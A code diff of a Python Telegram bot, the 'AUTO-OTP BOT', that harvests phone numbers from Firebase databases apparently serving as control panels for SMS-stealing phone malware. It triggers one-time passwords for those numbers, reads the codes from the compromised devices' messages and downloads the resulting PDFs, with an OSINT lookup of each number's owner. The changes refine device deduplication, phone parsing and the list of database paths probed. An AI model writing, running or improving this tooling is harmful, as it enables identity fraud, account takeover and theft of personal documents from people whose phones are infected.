@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.7                       ║
+║          AUTO-OTP BOT v1.8                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -50,7 +50,7 @@ NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
 PROXY_FILE = "proxies.txt"
 PROXY_POOL = []
 
-# OTP wait time (seconds) — reduced from 120 to 60
+# OTP wait time (seconds)
 OTP_WAIT_SECONDS = 60
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -302,7 +302,9 @@ def dl_pdf(eid,otp,otxn,tid):
 # ============== FIREBASE — PHONE HELPERS ==============
 def _looks_like_phone(s):
     """Return normalized 10-digit Indian mobile or None."""
-    if not s: return None
+    if s is None: return None
+    if isinstance(s, (int, float)):
+        s = str(int(s))
     d = re.sub(r'[^0-9]', '', str(s))
     if len(d) == 12 and d.startswith('91'): d = d[2:]
     if len(d) == 11 and d.startswith('0'): d = d[1:]
@@ -312,16 +314,17 @@ def _looks_like_phone(s):
 
 def _phone_from_any(obj, depth=0):
     """Recursively look for a phone-looking value under known keys."""
-    if depth > 3 or not isinstance(obj, dict): return None
-    # `to` first — that's what your DB uses
+    if depth > 4 or not isinstance(obj, dict): return None
+    # Direct keys first — `to` is what your DB uses
     for k in ("to","number","phone","phoneNumber","mobNo","mobile","num",
-              "msisdn","contact","user","recipient","target","destination"):
+              "msisdn","contact","user","recipient","target","destination",
+              "Phone","Mobile","PhoneNumber","MobNo"):
         if k in obj:
             p = _looks_like_phone(obj[k])
             if p: return p
-    # Nested one level
+    # Nested one level deeper
     for k in ("commands","sendSms","send_sms","sms","smsCommand",
-              "webhookEvent","action","command","data","info"):
+              "webhookEvent","action","command","data","info","client","device"):
         if k in obj and isinstance(obj[k], dict):
             p = _phone_from_any(obj[k], depth+1)
             if p: return p
@@ -329,7 +332,8 @@ def _phone_from_any(obj, depth=0):
 
 
 def _is_online(dd):
-    st = dd.get("status") if isinstance(dd, dict) else None
+    if not isinstance(dd, dict): return False
+    st = dd.get("status")
     if st is True or st == 1: return True
     if isinstance(st, str) and st.strip().lower() in ("true","1","online","on","active","yes","connected"):
         return True
@@ -337,29 +341,34 @@ def _is_online(dd):
 
 
 def fb_scan():
-    """Scan all DBs. Dedupe by phone — keep the freshest online device per phone."""
-    by_phone = {}  # phone -> best candidate
+    """Scan all DBs and return ONLINE devices — ONE ROW PER UNIQUE PHONE.
+
+    Two-stage:
+      1. Collect every online candidate into `raw`
+      2. Hard-dedupe by phone → keep best (freshest lastMessageTime, then highest battery)
+    """
+    raw = []   # all online candidates
 
     with firebase_lock: dbs = list(firebase_dbs)
 
     for db in dbs:
         url = db['url'].rstrip('/'); auth = db['auth']
 
-        # 1) /clients
+        # /clients
         try:
             r = requests.get(f"{url}/clients.json?auth={auth}", timeout=12)
             clients = r.json() if r.status_code == 200 else None
         except: clients = None
         if not isinstance(clients, dict) or not clients: continue
 
-        # 2) /commands
+        # /commands (fallback phone source)
         try:
             r = requests.get(f"{url}/commands.json?auth={auth}", timeout=12)
             commands = r.json() if r.status_code == 200 else {}
         except: commands = {}
         if not isinstance(commands, dict): commands = {}
 
-        # 3) /sendSms (fallback)
+        # /sendSms (fallback phone source)
         try:
             r = requests.get(f"{url}/sendSms.json?auth={auth}", timeout=12)
             sendsms = r.json() if r.status_code == 200 else {}
@@ -379,46 +388,53 @@ def fb_scan():
                 ph = _phone_from_any(commands[did])
             if not ph and did in sendsms:
                 ph = _phone_from_any(sendsms[did])
-            if not ph:
-                logger.info(f"[SCAN] no phone for {did}")
-                continue
+            if not ph: continue
 
-            # Score for dedupe
+            # Freshness score
             last_ts = 0
             for k in ("lastMessageTime","last_message_time","lastSeen","timestamp"):
                 v = dd.get(k)
                 if isinstance(v, (int, float)) and v > last_ts:
                     last_ts = int(v)
 
+            # Battery score
             batt_raw = str(dd.get("battery","")).replace("%","").strip()
             try: batt = int(batt_raw) if batt_raw else 0
             except: batt = 0
 
-            candidate = {
+            raw.append({
                 "db_url": url, "db_auth": auth,
                 "dev_id": did, "phone": ph, "phone_display": ph,
                 "battery": str(dd.get("battery","?"))[:6],
                 "last_ts": last_ts, "batt_int": batt,
-            }
-
-            prev = by_phone.get(ph)
-            if prev is None or (candidate["last_ts"], candidate["batt_int"]) > \
-                               (prev["last_ts"], prev["batt_int"]):
-                by_phone[ph] = candidate
-
-    # Filter out already-used numbers and return list
-    devs = []
-    with used_lock:
-        for ph, cand in by_phone.items():
-            if ph in used_numbers: continue
-            devs.append({
-                "db_url": cand["db_url"], "db_auth": cand["db_auth"],
-                "dev_id": cand["dev_id"], "phone": cand["phone"],
-                "phone_display": cand["phone_display"],
-                "battery": cand["battery"],
             })
 
-    logger.info(f"[SCAN] unique online phones: {len(devs)}")
+    logger.info(f"[SCAN] raw candidates: {len(raw)}")
+
+    # ---- HARD DEDUPE ----
+    best = {}   # phone -> candidate
+    for c in raw:
+        prev = best.get(c["phone"])
+        if prev is None:
+            best[c["phone"]] = c
+        elif (c["last_ts"], c["batt_int"]) > (prev["last_ts"], prev["batt_int"]):
+            best[c["phone"]] = c
+
+    logger.info(f"[SCAN] unique phones after dedupe: {len(best)}")
+
+    # Filter already-used numbers
+    devs = []
+    with used_lock:
+        for ph, c in best.items():
+            if ph in used_numbers: continue
+            devs.append({
+                "db_url": c["db_url"], "db_auth": c["db_auth"],
+                "dev_id": c["dev_id"], "phone": c["phone"],
+                "phone_display": c["phone_display"],
+                "battery": c["battery"],
+            })
+
+    logger.info(f"[SCAN] returning {len(devs)} devices (after used-filter)")
     return devs
 
 
@@ -508,7 +524,7 @@ def auto_worker(cid, count):
             if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ OTP failed: {lerr}")
             continue
 
-        wait_min = OTP_WAIT_SECONDS // 60
+        wait_min = max(1, OTP_WAIT_SECONDS // 60)
         if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n✓ OTP sent!\n<i>◌ Waiting SMS ({wait_min}min)...</i>")
         otp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids,OTP_WAIT_SECONDS)
         if not otp:
@@ -722,8 +738,6 @@ def handle(cid, text):
                                 report.append(f"  {i}. <code>{did[:14]}</code> = {str(dd)[:60]}")
                     elif isinstance(data, list):
                         report.append(f"◈ /clients is a LIST of {len(data)} items")
-                        if data and isinstance(data[0], dict):
-                            report.append(f"  item[0] fields: {', '.join(list(data[0].keys())[:15])}")
                     else:
                         report.append(f"◈ returned: {str(data)[:100]}")
                 else:
@@ -736,10 +750,7 @@ def handle(cid, text):
                 if r2.status_code == 200 and isinstance(r2.json(), dict):
                     top = list(r2.json().keys())[:20]
                     report.append(f"◈ top-level keys: {', '.join(top)}")
-                else:
-                    report.append(f"◈ .json shallow → HTTP {r2.status_code}")
-            except Exception as e:
-                report.append(f"◈ .json ERROR: {str(e)[:80]}")
+            except: pass
 
         full = "\n".join(report)
         for i in range(0, len(full), 3800):
@@ -757,10 +768,9 @@ def handle(cid, text):
             url = db['url'].rstrip('/'); auth = db['auth']
             report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:45]}</code>")
 
-            for path in ["users","user_data","All_User","All_Users",
-                         "registeredDevices","Verify_Device","devices",
-                         "panel","bot_users","bookings","profex_incoming",
-                         "callForwarding","settings","commands","sendSms"]:
+            for path in ["commands","sendSms","users","user_data","All_User",
+                         "All_Users","registeredDevices","Verify_Device","devices",
+                         "panel","bot_users","bookings","profex_incoming","settings"]:
                 try:
                     r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=12)
                     code = r.status_code
